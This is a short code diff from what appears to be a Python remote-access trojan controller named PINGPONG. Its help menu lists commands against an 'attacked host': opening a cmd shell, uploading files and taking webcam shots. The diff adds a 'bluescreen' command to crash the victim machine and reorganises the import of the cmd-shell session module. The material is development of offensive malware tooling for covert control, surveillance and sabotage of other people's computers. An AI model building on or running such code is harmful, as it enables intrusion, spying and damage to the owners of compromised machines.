@@ -79,6 +79,7 @@ def print_help():
                 info : printout the ip and port of both the hosts
             the below usage will be activate if u set it when u are generating the payload
             if u have this usage, type command to use it:
+                bluescreen : make a bluescreen o the attacked host
                 cmd : make a cmd connection
                 upload : upload your file
                 cam_shot : take shot
@@ -185,10 +186,10 @@ def sub_main():
                 if session[5] == 'PINGPONG session':
                     handler.PINGPONG_shell(session[0], session[1], session[2], session[3], session[4], False, '')
                 elif session[5] == 'CMD session':
-                    import PINGPONG_script.cmdshell
+                    import PINGPONG_script.basic_command.cmdshell as cmd
                     # [cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session']
                     # (cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session)
-                    PINGPONG_script.cmdshell.cmd_shell(session[0], session[1], session[2], session[3], session[4], ' ', None, None)
+                    cmd.cmd_shell(session[0], session[1], session[2], session[3], session[4], ' ', None, None)
             back_to_sessions()
     elif choice == '5':
         if session_pool == None or session_pool == []:
